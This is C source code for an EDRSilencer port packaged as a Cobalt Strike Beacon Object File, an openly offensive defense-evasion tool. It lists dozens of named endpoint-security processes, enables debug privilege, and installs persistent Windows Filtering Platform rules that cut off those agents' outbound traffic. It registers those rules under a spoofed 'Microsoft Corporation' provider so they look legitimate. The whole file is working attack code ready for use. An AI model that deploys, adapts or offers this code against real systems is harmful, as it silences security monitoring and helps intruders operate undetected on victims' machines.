/**
 * Copyright 2024 Aon plc
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/*
ported from https://github.com/netero1010/EDRSilencer
*/

#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "utils.h"

char* edrProcess[] = {
// Microsoft Defender for Endpoint and Microsoft Defender Antivirus
    "MsMpEng.exe",
    "MsSense.exe",
    "SenseIR.exe",
    "SenseNdr.exe",
    "SenseCncProxy.exe",
    "SenseSampleUploader.exe",
// Elastic EDR
	"winlogbeat.exe",
    "elastic-agent.exe",
    "elastic-endpoint.exe",
    "filebeat.exe",
// Trellix EDR
    "xagt.exe",
// Qualys EDR
    "QualysAgent.exe",
// SentinelOne
    "SentinelAgent.exe",
    "SentinelAgentWorker.exe",
    "SentinelServiceHost.exe",
    "SentinelStaticEngine.exe",  
    "LogProcessorService.exe",
    "SentinelStaticEngineScanner.exe",
    "SentinelHelperService.exe",
    "SentinelBrowserNativeHost.exe",
// Cylance
    "CylanceSvc.exe",
// Cybereason
    "AmSvc.exe",
    "CrAmTray.exe",
    "CrsSvc.exe",
    "ExecutionPreventionSvc.exe",
    "CybereasonAV.exe",
// Carbon Black EDR
    "cb.exe",
// Carbon Black Cloud
    "RepMgr.exe",
    "RepUtils.exe",
    "RepUx.exe",
    "RepWAV.exe",
    "RepWSC.exe",
// Tanium
    "TaniumClient.exe",
    "TaniumCX.exe",
    "TaniumDetectEngine.exe",
// Palo Alto Networks Traps/Cortex XDR
    "Traps.exe",
    "cyserver.exe",
    "CyveraService.exe",
    "CyvrFsFlt.exe",
// FortiEDR
    "fortiedr.exe",
// Cisco Secure Endpoint (Formerly Cisco AMP)
    "sfc.exe",
// ESET Inspect
    "EIConnector.exe",
    "ekrn.exe",
// Harfanglab EDR
    "hurukai.exe",
//TrendMicro Apex One
    "CETASvc.exe",
    "WSCommunicator.exe",
    "EndpointBasecamp.exe",
    "TmListen.exe",
    "Ntrtscan.exe",
    "TmWSCSvc.exe",
    "PccNTMon.exe",
    "TMBMSRV.exe",
    "CNTAoSMgr.exe",
    "TmCCSF.exe"
};

// The "unblockall" feature will delete all filters that are based on the custom filter name
WCHAR* filterName = L"Custom Outbound Filter";
WCHAR* providerName = L"Microsoft Corporation";
// provider description has to be unique because:
// - avoid problem in adding persistent WFP filter to a provider (error 0x80320016)
// - avoid removing legitimate WFP provider
WCHAR* providerDescription = L"Microsoft Windows WFP Built-in custom provider.";

BOOL inWfpFlag[sizeof(edrProcess) / sizeof(edrProcess[0])] = { FALSE };

// Check if the running process is our list
BOOL isInEdrProcessList(const char* procName) {
    for (int i = 0; i < sizeof(edrProcess) / sizeof(edrProcess[0]); i++) {
        if (StringCompareA(procName, edrProcess[i]) == 0 && !inWfpFlag[i]) {
            inWfpFlag[i] = TRUE;
            return TRUE;
        }
    }
    return FALSE;
}

// Add WFP filters for all known EDR process(s)
void BlockEdrProcessTraffic() {
    DWORD result = 0;
    HANDLE hEngine = NULL;
    HANDLE hProcessSnap = NULL;
    //HANDLE hModuleSnap = NULL;
    PROCESSENTRY32 pe32 = {0};
    BOOL isEdrDetected = FALSE;

    result = _FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        err("FwpmEngineOpen0 failed with error code: 0x%lx.\n", result);
        return;
    }
   
    EnableSeDebugPrivilege();

    hProcessSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        err("CreateToolhelp32Snapshot (of processes) failed with error code: 0x%lx.\n", KERNEL32$GetLastError());
        return;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!KERNEL32$Process32First(hProcessSnap, &pe32)) {
        err("Process32First failed with error code: 0x%lx.\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hProcessSnap);
        return;
    }

    do {
        if (isInEdrProcessList(pe32.szExeFile)) {
            isEdrDetected = TRUE;
            msg("Detected running EDR process: %s (%ld):\n", pe32.szExeFile, pe32.th32ProcessID);
            // Get full path of the running process
            HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                WCHAR fullPath[MAX_PATH] = {0};
                DWORD size = MAX_PATH;
                FWPM_FILTER_CONDITION0 cond = {0};
                FWPM_FILTER0 filter = {0};
                FWPM_PROVIDER0 provider = {0};
                GUID providerGuid = {0};
                FWP_BYTE_BLOB* appId = NULL;
                UINT64 filterId = 0;
                ErrorCode errorCode = CUSTOM_SUCCESS;
                
                KERNEL32$QueryFullProcessImageNameW(hProcess, 0, fullPath, &size);
                errorCode = CustomFwpmGetAppIdFromFileName0(fullPath, &appId);
                if (errorCode != CUSTOM_SUCCESS) {
                    switch (errorCode) {
                        case CUSTOM_FILE_NOT_FOUND:
                            err("CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The file path cannot be found.\n", fullPath);
                            break;
                        case CUSTOM_MEMORY_ALLOCATION_ERROR:
                            err("CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Error occurred in allocating memory for appId.\n", fullPath);
                            break;
                        case CUSTOM_NULL_INPUT:
                            err("CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Please check your input.\n", fullPath);
                            break;
                        case CUSTOM_DRIVE_NAME_NOT_FOUND:
                            err("CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The drive name cannot be found.\n", fullPath);
                            break;
                        case CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME:
                            err("CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Failed to convert drive name to DOS device name.\n", fullPath);
                            break;
                        default:
                            break;
                    }
                    KERNEL32$CloseHandle(hProcess);
                    continue;
                } 

                // Sett up WFP filter and condition
                filter.displayData.name = filterName;
                filter.flags = FWPM_FILTER_FLAG_PERSISTENT;
                filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
                filter.action.type = FWP_ACTION_BLOCK;
                cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;
                cond.matchType = FWP_MATCH_EQUAL;
                cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;
                cond.conditionValue.byteBlob = appId;
                filter.filterCondition = &cond;
                filter.numFilterConditions = 1;

                 // Add WFP provider for the filter
                if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
                    filter.providerKey = &providerGuid;
                } else {
                    provider.displayData.name = providerName;
                    provider.displayData.description = providerDescription;
                    provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
                    result = _FwpmProviderAdd0(hEngine, &provider, NULL);
                    if (result != ERROR_SUCCESS) {
                        err("FwpmProviderAdd0 failed with error code: 0x%lx.\n", result);
                    } else {
                        if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
                            filter.providerKey = &providerGuid;
                        }
                    }
                }

                // Add filter to both IPv4 and IPv6 layers
                result = _FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
                if (result == ERROR_SUCCESS) {
                    msg("Added WFP filter for \"%S\" (Filter id: %lld, IPv4 layer).\n", fullPath, filterId);
                } else {
                    err("Failed to add filter in IPv4 layer with error code: 0x%lx.\n", result);
                }
                
                filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
                result = _FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
                if (result == ERROR_SUCCESS) {
                    msg("Added WFP filter for \"%S\" (Filter id: %lld, IPv6 layer).\n", fullPath, filterId);
                } else {
                    err("Failed to add filter in IPv6 layer with error code: 0x%lx.\n", result);
                }

                FreeAppId(appId);
                KERNEL32$CloseHandle(hProcess);
            } else {
                err("Could not open process \"%s\" with error code: 0x%lx.\n", pe32.szExeFile, KERNEL32$GetLastError());
            }
        }
    } while (KERNEL32$Process32Next(hProcessSnap, &pe32));

    if (!isEdrDetected) {
        err("No EDR process was detected. Please double check the edrProcess list or add the filter manually using 'block' command.\n");
    }
    KERNEL32$CloseHandle(hProcessSnap);
    _FwpmEngineClose0(hEngine);
    return;
}

// Add block WFP filter to user-defined process
void BlockProcessTraffic(char* fullPath) {
    DWORD result = 0;
    HANDLE hEngine = NULL;
    WCHAR wFullPath[MAX_PATH] = {0};
    //DWORD size = MAX_PATH;
    FWPM_FILTER_CONDITION0 cond = {0};
    FWPM_FILTER0 filter = {0};
    FWPM_PROVIDER0 provider = {0};
    GUID providerGuid = {0};
    FWP_BYTE_BLOB* appId = NULL;
    UINT64 filterId = 0;
    ErrorCode errorCode = CUSTOM_SUCCESS;
    
    result = _FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        err("FwpmEngineOpen0 failed with error code: 0x%lx.\n", result);
        return;
    }

    CharArrayToWCharArray(fullPath, wFullPath, sizeof(wFullPath) / sizeof(wFullPath[0]));
    errorCode = CustomFwpmGetAppIdFromFileName0(wFullPath, &appId);
    if (errorCode != CUSTOM_SUCCESS) {
        switch (errorCode) {
            case CUSTOM_FILE_NOT_FOUND:
                err("CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The file path cannot be found.\n", wFullPath);
                break;
            case CUSTOM_MEMORY_ALLOCATION_ERROR:
                err("CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Error occurred in allocating memory for appId.\n", wFullPath);
                break;
            case CUSTOM_NULL_INPUT:
                err("CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Please check your input.\n", wFullPath);
                break;
            case CUSTOM_DRIVE_NAME_NOT_FOUND:
                err("CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The drive name cannot be found.\n", wFullPath);
                break;
            case CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME:
                err("CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Failed to convert drive name to DOS device name.\n", wFullPath);
                break;
            default:
                break;
        }
        return;
    }
    // Setting up WFP filter and condition
    filter.displayData.name = filterName;
    filter.flags = FWPM_FILTER_FLAG_PERSISTENT;
    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    filter.action.type = FWP_ACTION_BLOCK;
    cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    cond.matchType = FWP_MATCH_EQUAL;
    cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    cond.conditionValue.byteBlob = appId;
    filter.filterCondition = &cond;
    filter.numFilterConditions = 1;

    // Add WFP provider for the filter
    if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
        //msg("Adding filter to existing provider: %S\n", providerDescription);
        filter.providerKey = &providerGuid;
    } else {
        //msg("Creating new provider: %S\n", providerDescription);
        provider.displayData.name = providerName;
        provider.displayData.description = providerDescription;
        provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
        result = _FwpmProviderAdd0(hEngine, &provider, NULL);
        if (result != ERROR_SUCCESS) {
            err("FwpmProviderAdd0 failed with error code: 0x%lx.\n", result);
        } else {
            if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
                filter.providerKey = &providerGuid;
            }
        }
    }

    // Add filter to both IPv4 and IPv6 layers
    result = _FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
    if (result == ERROR_SUCCESS) {
        msg("Added WFP filter for \"%s\" (Filter id: %lld, IPv4 layer).\n", fullPath, filterId);
    } else {
        err("Failed to add filter in IPv4 layer with error code: 0x%lx.\n", result);
    }

    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
    result = _FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
    if (result == ERROR_SUCCESS) {
        msg("Added WFP filter for \"%s\" (Filter id: %lld, IPv6 layer).\n", fullPath, filterId);
    } else {
        err("Failed to add filter in IPv6 layer with error code: 0x%lx.\n", result);
    }

    FreeAppId(appId);
    _FwpmEngineClose0(hEngine);
    return;
}

// Remove all WFP filters previously created
void UnblockAllWfpFilters() {
    HANDLE hEngine = NULL;
    DWORD result = 0;
    HANDLE enumHandle = NULL;
    FWPM_FILTER0** filters = NULL;
    GUID providerGuid = {0};
    UINT32 numFilters = 0;
    BOOL foundFilter = FALSE;
    result = _FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        err("FwpmEngineOpen0 failed with error code: 0x%lx.\n", result);
        return;
    }

    result = _FwpmFilterCreateEnumHandle0(hEngine, NULL, &enumHandle);
    if (result != ERROR_SUCCESS) {
        err("FwpmFilterCreateEnumHandle0 failed with error code: 0x%lx.\n", result);
        return;
    }

    while(TRUE) {
        result = _FwpmFilterEnum0(hEngine, enumHandle, 1, &filters, &numFilters);

        if (result != ERROR_SUCCESS) {
            err("FwpmFilterEnum0 failed with error code: 0x%lx.\n", result);
            _FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
            _FwpmEngineClose0(hEngine);
            return;
        }

        if (numFilters == 0) {
			break;
        }
        
        FWPM_DISPLAY_DATA0 *data = &filters[0]->displayData;
        WCHAR* currentFilterName = data->name;
        if (StringCompareW(currentFilterName, filterName) == 0) {
            foundFilter = TRUE;
            UINT64 filterId = filters[0]->filterId;
            result = _FwpmFilterDeleteById0(hEngine, filterId);
            if (result == ERROR_SUCCESS) {
                msg("Deleted filter id: %llu.\n", filterId);
            } else {
                err("Failed to delete filter id: %llu with error code: 0x%lx.\n", filterId, result);
            }
        }
    }

    if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
        result = _FwpmProviderDeleteByKey0(hEngine, &providerGuid);
        if (result != ERROR_SUCCESS) {
            if (result != FWP_E_IN_USE) {
                err("FwpmProviderDeleteByKey0 failed with error code: 0x%lx.\n", result);
            }
        } else {
            msg("Deleted custom WFP provider.\n");
        }
    }

    if (!foundFilter) {
        err("Unable to find any WFP filter created by this tool.\n");
    }
    _FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
    _FwpmEngineClose0(hEngine);
}

// Remove WFP filter based on filter id
void UnblockWfpFilter(UINT64 filterId) {
    HANDLE hEngine = NULL;
    DWORD result = 0;
    GUID providerGuid = {0};

    result = _FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        err("FwpmEngineOpen0 failed with error code: 0x%lx.\n", result);
        return;
    }
    
    result = _FwpmFilterDeleteById0(hEngine, filterId);

    if (result == ERROR_SUCCESS) {
        msg("Deleted filter id: %llu.\n", filterId);
    }
    else if (result == FWP_E_FILTER_NOT_FOUND) {
        err("The filter does not exist.\n");
    } else {
        err("Failed to delete filter id: %llu with error code: 0x%lx.\n", filterId, result);
    }

    if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
        result = _FwpmProviderDeleteByKey0(hEngine, &providerGuid);
        if (result != ERROR_SUCCESS) {
            if (result != FWP_E_IN_USE) {
                err("FwpmProviderDeleteByKey0 failed with error code: 0x%lx.\n", result);
            }
        } else {
            msg("Deleted custom WFP provider.\n");
        }
    }

    _FwpmEngineClose0(hEngine);
}

#ifdef BOF
void go(char * args, int alen) {

    //parse bof arguments
    datap parser = {0};
    PCHAR cmd_str = NULL;
    PCHAR prog_path = NULL;
    
    BeaconDataParse(&parser, args, alen);
    cmd_str = BeaconDataExtract(&parser, NULL);
    prog_path = BeaconDataExtract(&parser, NULL);
    prog_path = *prog_path == 0 ? NULL : prog_path;

    if (!InitFWPM()) {
        err("Init functions failed\n");
        return;
    }

    if (!CheckProcessIntegrityLevel()) {
        return;
    }

    if (StringCompareA(cmd_str, "blockedr") == 0) {
        BlockEdrProcessTraffic();
    }
    else if (StringCompareA(cmd_str, "unblockall") == 0) {
        UnblockAllWfpFilters();
    }
    else if (StringCompareA(cmd_str, "block") == 0) {
        if (!prog_path) {
            err("Missing second argument. Please provide the full path of the process to block.\n");
            return;
        }
        msg("Blocking traffic for process %s\n", prog_path);
        BlockProcessTraffic(prog_path);
    }
    else if (StringCompareA(cmd_str, "unblock") == 0) {
        if (!prog_path) {
            err("Missing argument for 'unblock' command. Please provide the filter id.\n");
            return;
        }
        char *endptr;

        UINT64 filterId = StringToUINT64(prog_path, &endptr, 10);

        if (filterId == 0) {
            err("Failed to read filterId\n");
            return;
        }

        if (endptr == prog_path) {
            err("Please provide filter id in digits.\n");
            return;
        }
        UnblockWfpFilter(filterId);
    }
    else {
        err("Invalid argument: \"%s\".\n", cmd_str);
        return;
    }
}
#else
void PrintHelp() {
    printf("Usage: EDRSilencer.exe <blockedr/block/unblockall/unblock>\n");
    printf("Version: 1.3\n");
    printf("- Add WFP filters to block the IPv4 and IPv6 outbound traffic of all detected EDR processes:\n");
    printf("  EDRSilencer.exe blockedr\n\n");
    printf("- Add WFP filters to block the IPv4 and IPv6 outbound traffic of a specific process (full path is required):\n");
    printf("  EDRSilencer.exe block \"C:\\Windows\\System32\\curl.exe\"\n\n");
    printf("- Remove all WFP filters applied by this tool:\n");
    printf("  EDRSilencer.exe unblockall\n\n");
    printf("- Remove a specific WFP filter based on filter id:\n");
    printf("  EDRSilencer.exe unblock <filter id>");
}

int main(int argc, char *argv[]) {
    
    if (argc < 2) {
        PrintHelp();
        return 1;
    }

    if (strcasecmp(argv[1], "-h") == 0 || strcasecmp(argv[1], "--help") == 0) {
        PrintHelp();
        return 1;
    }

    if (!InitFWPM()) {
        err("Init functions failed\n");
        return 1;
    }
    
    if (!CheckProcessIntegrityLevel()) {
        return 1;
    }

    if (strcmp(argv[1], "blockedr") == 0) {
        BlockEdrProcessTraffic();
    } else if (strcmp(argv[1], "block") == 0) {
        if (argc < 3) {
            err("Missing second argument. Please provide the full path of the process to block.\n");
            return 1;
        }
        BlockProcessTraffic(argv[2]);
    } else if (strcmp(argv[1], "unblockall") == 0) {
        UnblockAllWfpFilters();
    } else if (strcmp(argv[1], "unblock") == 0) {
        if (argc < 3) {
            err("Missing argument for 'unblock' command. Please provide the filter id.\n");
            return 1;
        }
        char *endptr;
        errno = 0;

        UINT64 filterId = strtoull(argv[2], &endptr, 10);

        if (errno != 0) {
            err("strtoull failed with error code: 0x%x.\n", errno);
            return 1;
        }

        if (endptr == argv[2]) {
            err("Please provide filter id in digits.\n");
            return 1;
        }
        UnblockWfpFilter(filterId);
    } else {
        err("Invalid argument: \"%s\".\n", argv[1]);
        return 1;
    }
}
#endif